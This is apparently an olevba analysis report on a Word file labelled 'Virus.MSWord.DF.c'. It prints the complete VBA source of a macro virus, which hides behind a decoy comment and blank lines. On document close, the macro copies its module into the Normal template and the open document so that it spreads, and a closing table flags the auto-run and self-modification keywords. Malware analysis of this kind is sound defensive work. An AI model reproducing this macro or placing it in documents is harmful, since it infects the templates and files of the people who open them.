olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.DF.c
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.DF.c - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Модуль1.bas 
in file: Virus.MSWord.DF.c - OLE stream: 'Macros/VBA/Модуль1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'There is nothing here






























Sub AutoClose()
'On Error GoTo 10
'Application.OrganizerCopy Source:=Word.MacroContainer, Destination:=NormalTemplate.Name, Name:="Модуль1", Object:=wdOrganizerObjectProjectItems
For I = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents.Item(I).Name = "Модуль1" Then
installn = 1
Exit For
Else
installn = 0
End If
Next
For t = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents.Item(t).Name = "Модуль1" Then
Installdoc = 1
Exit For
Else
Installdoc = 0
End If
Next
If Installdoc = 0 Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Модуль1", Object:=wdOrganizerObjectProjectItems

End If
If installn = 0 Then
Application.OrganizerCopy Source:=Word.MacroContainer, Destination:=NormalTemplate.FullName, Name:="Модуль1", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
End If
End Sub
Sub AutoOpen()

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

